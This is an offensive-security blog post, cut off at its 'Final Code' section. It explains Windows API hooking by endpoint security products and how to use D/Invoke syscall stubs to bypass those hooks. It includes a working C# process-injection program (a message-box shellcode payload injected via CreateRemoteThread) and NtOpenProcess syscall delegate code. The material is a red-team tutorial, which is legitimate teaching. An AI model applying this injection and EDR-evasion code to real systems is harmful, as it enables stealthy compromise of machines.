<!doctype html>
<html lang="en-us">
  <head>
    <title>Syscalls with D/Invoke - Offensive Defence</title>
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.82.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://offensivedefence.co.uk/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
    <script src="https://kit.fontawesome.com/89e1a73a2b.js" crossorigin="anonymous"></script>

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Syscalls with D/Invoke"/>
<meta name="twitter:description" content="Windows Architecture Primer x86 processors have 4 privilege levels, known as rings, that control access to memory and CPU operations. They range from Ring 0, the most privileged, to Ring 3.
Image credit: Wikipedia
Windows only supports Rings 0 and 3, affectionately known as Kernel and User Mode respectively. The majority of user activity will occur in Ring 3 but applications may cross into Ring 0 when calling a variety of APIs - this is required when accessing the filesystem for example."/>

    <meta property="og:title" content="Syscalls with D/Invoke" />
<meta property="og:description" content="Windows Architecture Primer x86 processors have 4 privilege levels, known as rings, that control access to memory and CPU operations. They range from Ring 0, the most privileged, to Ring 3.
Image credit: Wikipedia
Windows only supports Rings 0 and 3, affectionately known as Kernel and User Mode respectively. The majority of user activity will occur in Ring 3 but applications may cross into Ring 0 when calling a variety of APIs - this is required when accessing the filesystem for example." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://offensivedefence.co.uk/posts/dinvoke-syscalls/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-01-24T15:19:05&#43;00:00" />
<meta property="article:modified_time" content="2021-01-24T15:19:05&#43;00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://offensivedefence.co.uk"><img class="app-header-avatar" src="/avatar.png" alt="John Doe" /></a>
      <h1>Offensive Defence</h1>
      <p>&#34;The hand which strikes also blocks.&#34;</p>

    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Syscalls with D/Invoke</h1>
      <div class="post-meta">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
</svg>
              <a class="tag" href="https://offensivedefence.co.uk/authors/rastamouse/">Rasta Mouse</a>
        
      
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jan 24, 2021
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          11 min read
        </div><div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
</svg>
          <a class="tag" href="https://offensivedefence.co.uk/tags/c#/">c#</a><a class="tag" href="https://offensivedefence.co.uk/tags/.net/">.net</a><a class="tag" href="https://offensivedefence.co.uk/tags/dinvoke/">dinvoke</a><a class="tag" href="https://offensivedefence.co.uk/tags/syscalls/">syscalls</a><a class="tag" href="https://offensivedefence.co.uk/tags/edr/">edr</a></div></div>
    </header>
    <div class="post-content">
      <h3 id="windows-architecture-primer">Windows Architecture Primer</h3>
<p>x86 processors have 4 privilege levels, known as rings, that control access to memory and CPU operations.  They range from Ring 0, the most privileged, to Ring 3.</p>
<p><img src="/images/dinvoke-syscalls/rings.png" alt="" title="Protection Rings"></p>
<p><sub>Image credit: Wikipedia</sub></p>
<p>Windows only supports Rings 0 and 3, affectionately known as Kernel and User Mode respectively.  The majority of user activity will occur in Ring 3 but applications may cross into Ring 0 when calling a variety of APIs - this is required when accessing the filesystem for example.</p>
<p>There is also a hierarchy to the native APIs.  User applications will generally call &ldquo;high-level&rdquo; APIs in kernel32 and user32 etc, and those APIs will call &ldquo;low-level&rdquo; APIs in ntdll.</p>
<p><img src="/images/dinvoke-syscalls/api.png" alt="" title="API Architecture"></p>
<p><sub>Image credit: TechNet</sub></p>
<p>If you&rsquo;re familiar with basic process injection, you will know that APIs such as <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code> are often used - all of which live inside kernel32.</p>
<p><code>OpenProcess</code> itself calls <code>NtOpenProcess</code> which can be observed in a tool such as <a href="http://www.rohitab.com/apimonitor">API Monitor</a>.</p>
<p><img src="/images/dinvoke-syscalls/openprocess.png" alt="" title="OpenProcess / NtOpenProcess"></p>
<p>Security vendors realised that if they were going to detect and/or block this type of activity, then they would need to hook these APIs.  There are different types of hooks that we won&rsquo;t look into detail here - but think of a hook as a type of man-in-the-middle.  Instead of pointing to the real function, an API call is redirected to a vendor-controlled module where it can be inspected and/or dropped.</p>
<p><img src="/images/dinvoke-syscalls/hooks.png" alt="" title="Basic hooking"></p>
<p><sub>Image credit: Practical Malware Analysis</sub></p>
<p>At first, vendors were only hooking APIs within kernel32, such as <code>OpenProcess</code>.  Attackers could circumvent this by calling <code>NtOpenProcess</code> directly (illustrated above) which would effectively bypass the vendors hook.  Vendors obviously started to push back by also hooking the corresponding Nt* functions as well.</p>
<p>So where do we go next?</p>
<h3 id="syscalls">Syscalls</h3>
<p>A system call (syscall) is the means by which <code>ntdll</code> transitions to the kernel.  We can &ldquo;unassemble&rdquo; NtOpenProcess in WinDBG easily enough to see the instructions.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">0:000&gt; u ntdll!NtOpenProcess
ntdll!NtOpenProcess:
00007ffd`8570c460 4c8bd1          mov     r10,rcx
00007ffd`8570c463 b826000000      mov     eax,26h
00007ffd`8570c468 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffd`8570c470 7503            jne     ntdll!NtOpenProcess+0x15 (00007ffd`8570c475)
00007ffd`8570c472 0f05            syscall
00007ffd`8570c474 c3              ret
00007ffd`8570c475 cd2e            int     2Eh
00007ffd`8570c477 c3              ret
</code></pre></div><p>There are also excellent <a href="https://j00ru.vexillium.org/">syscall lookup tables</a> that we can use as well.</p>
<p>D/Invoke has an excellent method called <code>GetSyscallStub</code> that will read <code>ntdll</code> from disk and find the syscall for a given API.  To demonstrate - this is the API trace of the typical OpenProcess/VirtualAllocEx/WriteProcessMemory/CreateRemoteThread (I&rsquo;ve blurred ones that are not directly related to the injection to preserve the clarity of the calls we want to focus on).</p>
<p><img src="/images/dinvoke-syscalls/injection-trace.png" alt="" title="Original API Trace"></p>
<p>This was tested with the following code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> System;
<span style="color:#66d9ef">using</span> System.Runtime.InteropServices;

<span style="color:#66d9ef">namespace</span> ConsoleApp1
{
    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
    {
        <span style="color:#75715e">// msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">readonly</span> <span style="color:#66d9ef">byte</span>[] _shellcode = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">323</span>] {
            <span style="color:#ae81ff">0</span>xfc,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x81,<span style="color:#ae81ff">0</span>xe4,<span style="color:#ae81ff">0</span>xf0,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xe8,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,
            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x56,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xd2,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x60,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,
            <span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,
            <span style="color:#ae81ff">0</span>x0f,<span style="color:#ae81ff">0</span>xb7,<span style="color:#ae81ff">0</span>x4a,<span style="color:#ae81ff">0</span>x4a,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>xac,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x61,<span style="color:#ae81ff">0</span>x7c,<span style="color:#ae81ff">0</span>x02,
            <span style="color:#ae81ff">0</span>x2c,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x0d,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xe2,<span style="color:#ae81ff">0</span>xed,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x3e,
            <span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x42,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>x88,
            <span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x85,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>x74,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x48,
            <span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>xe3,<span style="color:#ae81ff">0</span>x5c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x3e,
            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x34,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd6,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>xac,<span style="color:#ae81ff">0</span>x41,
            <span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x0d,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>x38,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>xf1,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x03,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x24,
            <span style="color:#ae81ff">0</span>x08,<span style="color:#ae81ff">0</span>x45,<span style="color:#ae81ff">0</span>x39,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>xd6,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x24,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,
            <span style="color:#ae81ff">0</span>x66,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x0c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x1c,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x3e,
            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x5e,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x41,
            <span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xec,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,
            <span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x12,<span style="color:#ae81ff">0</span>xe9,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>x5d,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>xc7,<span style="color:#ae81ff">0</span>xc1,
            <span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8d,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>x1a,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x8d,
            <span style="color:#ae81ff">0</span>x85,<span style="color:#ae81ff">0</span>x2b,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xba,<span style="color:#ae81ff">0</span>x45,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>x56,<span style="color:#ae81ff">0</span>x07,<span style="color:#ae81ff">0</span>xff,
            <span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x1d,<span style="color:#ae81ff">0</span>x2a,<span style="color:#ae81ff">0</span>x0a,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xba,<span style="color:#ae81ff">0</span>xa6,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>xbd,<span style="color:#ae81ff">0</span>x9d,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x48,
            <span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xc4,<span style="color:#ae81ff">0</span>x28,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x06,<span style="color:#ae81ff">0</span>x7c,<span style="color:#ae81ff">0</span>x0a,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>xfb,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>x05,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>x47,<span style="color:#ae81ff">0</span>x13,
            <span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x6a,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>xda,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x6c,<span style="color:#ae81ff">0</span>x6c,<span style="color:#ae81ff">0</span>x6f,
            <span style="color:#ae81ff">0</span>x2c,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x66,<span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x6d,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x53,<span style="color:#ae81ff">0</span>x46,<span style="color:#ae81ff">0</span>x21,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x73,
            <span style="color:#ae81ff">0</span>x73,<span style="color:#ae81ff">0</span>x61,<span style="color:#ae81ff">0</span>x67,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x42,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x78,<span style="color:#ae81ff">0</span>x00 };

    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
        {
            <span style="color:#66d9ef">var</span> hProcess = OpenProcess(
                <span style="color:#ae81ff">0</span>x001F0FFF,
                <span style="color:#66d9ef">false</span>,
                <span style="color:#66d9ef">int</span>.Parse(args[<span style="color:#ae81ff">0</span>]));

            <span style="color:#66d9ef">var</span> hRegion = VirtualAllocEx(
                hProcess,
                IntPtr.Zero,
                (<span style="color:#66d9ef">uint</span>)_shellcode.Length,
                <span style="color:#ae81ff">0</span>x1000 | <span style="color:#ae81ff">0</span>x2000,
                <span style="color:#ae81ff">0</span>x04); <span style="color:#75715e">// PAGE_READWRITE
</span><span style="color:#75715e"></span>
            WriteProcessMemory(
                hProcess,
                hRegion,
                _shellcode,
                (<span style="color:#66d9ef">uint</span>)_shellcode.Length,
                <span style="color:#66d9ef">out</span> UIntPtr _);

            VirtualProtectEx(
                hProcess,
                hRegion,
                (UIntPtr)_shellcode.Length,
                <span style="color:#ae81ff">0</span>x20,  <span style="color:#75715e">// PAGE_EXECUTE_READ
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> _);

            CreateRemoteThread(
                hProcess,
                IntPtr.Zero,
                <span style="color:#ae81ff">0</span>,
                hRegion,
                IntPtr.Zero,
                <span style="color:#ae81ff">0</span>,
                IntPtr.Zero);
        }
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr OpenProcess(
            <span style="color:#66d9ef">int</span> dwDesiredAccess,
            <span style="color:#66d9ef">bool</span> bInheritHandle,
            <span style="color:#66d9ef">int</span> dwProcessId);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            <span style="color:#66d9ef">uint</span> dwSize,
            <span style="color:#66d9ef">uint</span> flAllocationType,
            <span style="color:#66d9ef">uint</span> flProtect);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            <span style="color:#66d9ef">byte</span>[] lpBuffer,
            <span style="color:#66d9ef">uint</span> nSize,
            <span style="color:#66d9ef">out</span> UIntPtr lpNumberOfBytesWritten);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UIntPtr dwSize,
            <span style="color:#66d9ef">uint</span> flNewProtect,
            <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> lpflOldProtect);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            <span style="color:#66d9ef">uint</span> dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            <span style="color:#66d9ef">uint</span> dwCreationFlags, IntPtr lpThreadId);
    }
}
</code></pre></div><p>We shall now replace the standard P/Invoke with syscalls for each of these APIs.</p>
<h3 id="getsyscallstub">GetSyscallStub</h3>
<p>The first step is to replace the P/Invoke signatures with corresponding delegates targeting the Nt functions.  For instance, OpenProcess will be replaced with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
<span style="color:#66d9ef">delegate</span> NTSTATUS NtOpenProcess(
    <span style="color:#66d9ef">ref</span> IntPtr ProcessHandle,
    <span style="color:#66d9ef">uint</span> DesiredAccess,
    <span style="color:#66d9ef">ref</span> OBJECT_ATTRIBUTES ObjectAttributes,
    <span style="color:#66d9ef">ref</span> CLIENT_ID ClientId);
<span style="color:#a6e22e">                
</span><span style="color:#a6e22e">[StructLayout(LayoutKind.Sequential, Pack = 0)]</span>
<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">OBJECT_ATTRIBUTES</span>
{
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> Length;
    <span style="color:#66d9ef">public</span> IntPtr RootDirectory;
    <span style="color:#66d9ef">public</span> IntPtr ObjectName;
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> Attributes;
    <span style="color:#66d9ef">public</span> IntPtr SecurityDescriptor;
    <span style="color:#66d9ef">public</span> IntPtr SecurityQualityOfService;
}
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">[StructLayout(LayoutKind.Sequential)]</span>
<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CLIENT_ID</span>
{
    <span style="color:#66d9ef">public</span> IntPtr UniqueProcess;
    <span style="color:#66d9ef">public</span> IntPtr UniqueThread;
}
</code></pre></div><p>(<a href="https://github.com/TheWover/DInvoke/blob/main/DInvoke/DInvoke/SharedData/Native.cs">NTSTATUS</a> is a pretty big enum that I&rsquo;ve excluded for brevity).</p>
<p>Next, get a pointer to the syscall:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">IntPtr stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
</code></pre></div><p><code>GetSyscallStub</code> only takes a <code>FunctionName</code> and not a target DLL, since syscalls only exist in <code>ntdll</code>.</p>
<p>Marshal that pointer to the delegate:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">NtOpenProcess ntOpenProcess = (NtOpenProcess) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtOpenProcess));
</code></pre></div><p>And then call the method:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">IntPtr hProcess = IntPtr.Zero;
OBJECT_ATTRIBUTES oa = <span style="color:#66d9ef">new</span> OBJECT_ATTRIBUTES();

CLIENT_ID ci = <span style="color:#66d9ef">new</span> CLIENT_ID
{
    UniqueProcess = (IntPtr)<span style="color:#66d9ef">uint</span>.Parse(args[<span style="color:#ae81ff">0</span>])
};

NTSTATUS result = ntOpenProcess(
    <span style="color:#66d9ef">ref</span> hProcess,
    <span style="color:#ae81ff">0</span>x001F0FFF,
    <span style="color:#66d9ef">ref</span> oa,
    <span style="color:#66d9ef">ref</span> ci);
</code></pre></div><p>The return code should be Success and hProcess now contains a value.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">result
Success

hProcess
<span style="color:#ae81ff">0</span>x00000000000003bc
</code></pre></div><h3 id="final-code">Final Code</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> DInvoke.DynamicInvoke;

<span style="color:#66d9ef">using</span> System;
<span style="color:#66d9ef">using</span> System.Runtime.InteropServices;

<span style="color:#66d9ef">namespace</span> ConsoleApp1
{
    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
    {
        <span style="color:#75715e">// msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp
